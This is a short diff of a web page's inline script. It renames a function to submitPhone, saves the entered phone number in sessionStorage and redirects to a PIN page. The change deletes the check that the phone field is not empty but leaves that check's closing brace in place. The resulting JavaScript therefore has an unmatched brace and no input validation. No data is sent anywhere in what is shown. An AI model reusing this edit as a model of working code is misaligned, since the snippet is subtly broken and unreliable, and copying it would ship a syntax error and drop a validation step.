@@ -79,9 +79,9 @@
     </div>
   </div>
   <script>
-    function goToPin() {
-      const phone = document.getElementById("phone").value;
-      if (phone.trim() !== "") {
+    function submitPhone() {
+      const phone = document.getElementById('phone').value;
+      sessionStorage.setItem('phone', phone);
         window.location.href = "pin.html";
       }
     }
